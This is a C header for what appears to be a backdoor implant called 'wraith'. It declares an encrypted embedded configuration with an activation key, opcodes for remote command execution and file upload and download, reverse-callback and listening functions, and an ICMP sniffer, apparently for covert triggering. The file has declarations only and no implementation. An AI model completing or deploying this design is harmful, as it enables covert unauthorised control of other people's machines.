#ifndef _WRAITH_H
#define _WRAITH_H

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>

#ifdef DEBUG
    #define DEBUG_PRINT(fmt, ...) printf ("\033[34mDEBUG\033[0m **:%s:%d " fmt, __FILE__, __LINE__, ##__VA_ARGS__); printf ("\n");
    #define ERROR_PRINT(fmt, ...) printf ("\033[31mERROR\033[0m **:%s:%d " fmt, __FILE__, __LINE__, ##__VA_ARGS__); printf ("\n");
#else
    #define DEBUG_PRINT(fmt, ...) ;
    #define ERROR_PRINT(fmt, ...) ;
#endif

#define WRAITH_CONFIG_MAG0          0x64
#define WRAITH_CONFIG_MAG1          0xA0
#define WRAITH_CONFIG_MAG2          0x58
#define WRAITH_CONFIG_MAG3          0xA2

#define WRAITH_CMD_EXEC             0x01
#define WRAITH_CMD_CHDIR            0x02
#define WRAITH_CMD_PUT              0x03
#define WRAITH_CMD_GET              0x06

#define WRAITH_MSG_ECHO             0x10
#define WRAITH_MSG_CMD_SUCC         0x11
#define WRAITH_MSG_CMD_FAIL         0x12
#define WRAITH_MSG_PUT_SUCC         0x13
#define WRAITH_MSG_PUT_FAIL         0x14
#define WRAITH_MSG_GET_SUCC         0x15
#define WRAITH_MSG_GET_FAIL         0x16

typedef struct wraith_session wraith_session_t;

typedef void (*session_close_t)(wraith_session_t *session);
typedef ssize_t (*session_read_t)(wraith_session_t *session, char *buf, size_t nbyte);
typedef ssize_t (*session_write_t)(wraith_session_t *session, const char *buf, size_t nbyte);

struct wraith_config {
    uint8_t     salsa20_psk[16];
    uint8_t     activation_key[49];
    char        command[128];
    uint16_t    listen_port;
    uint32_t    modulo;
} __attribute__((packed));

struct wraith_config_block {
    uint8_t                 mag0;
    uint8_t                 mag1;
    uint8_t                 mag2;
    uint8_t                 mag3;
    uint8_t                 configured;
    uint8_t                 rc4_otp[32];
    uint8_t                 rc4_key[32];
    struct wraith_config    encrypted_config;
} __attribute__((packed));

struct wraith_session {
    int             fd;
    void *          state;
    session_close_t close_func;
    session_read_t  read_func;
    session_write_t write_func;
};

struct wraith_msg {
    uint8_t     opcode;
    uint32_t    arg;
    uint32_t    opt_payload_size;
} __attribute__((packed));


FILE *  popen_ex(const char *, const char *);
int     pclose_ex(FILE *);

bool    send_wraith_msg(wraith_session_t *, int, int, int, const char *);
bool    handle_wraith_msg(wraith_session_t *, struct wraith_msg *, char *);
void    wraith_cmd_loop(wraith_session_t *);

void    perform_callback(uint32_t, uint16_t);
void    perform_listen(int, uint16_t);

void    session_close(wraith_session_t *);
ssize_t session_read(wraith_session_t *, char *, size_t);
ssize_t session_read_all(wraith_session_t *, char *, size_t);
ssize_t session_write(wraith_session_t *, const char *, size_t);

void    sniff_icmp();

#endif
